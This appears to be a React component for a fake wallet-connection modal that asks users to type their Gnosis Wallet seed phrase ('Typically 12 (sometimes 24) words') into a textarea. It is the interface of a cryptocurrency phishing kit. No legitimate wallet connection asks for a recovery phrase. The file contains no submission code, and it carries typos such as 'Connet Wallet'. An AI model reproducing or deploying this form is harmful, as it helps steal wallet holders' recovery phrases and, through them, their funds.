import React from 'react';
import "./modali.css"
import "./main.css"
const Modali = (/* {classname, setOpen} */) => {
  return (
    <div className="bg_color"/*   onClick={setOpen} */ >
      <div  className="dinv">
        <p className='phr'>Phrase</p>
        <p className='para'>Establish a connection for yourGnosis WalletWallet</p>
        <form className='input'>
         <textarea name="message" rows="10" cols="30" placeholder='Wallet Phrase or Wallet Seed Words'></textarea>
       </form>
       <p className='para'>Typically 12 (sometimes 24) words separated by single spaces</p>
       <button className='btno'>Connet Wallet</button>
      </div>
    </div>
  );
}

export default Modali;
